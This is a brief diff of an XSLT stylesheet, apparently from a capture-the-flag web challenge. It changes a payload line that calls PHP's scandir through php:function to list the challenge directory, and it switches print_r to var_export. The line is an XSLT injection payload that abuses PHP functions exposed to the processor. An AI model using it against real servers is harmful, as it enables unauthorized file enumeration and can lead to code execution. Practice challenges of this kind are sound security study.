@@ -9,7 +9,7 @@
     <html>
       <body>
         <pre>
-<xsl:value-of select="php:functionString('print_r', php:function('scandir', '/challenge/web-serveur/ch50'), '1')" />
+<xsl:value-of select="php:functionString('var_export', php:function('scandir', '/challenge/web-serveur/ch50'), '1')" />
         </pre>
       </body>
     </html>
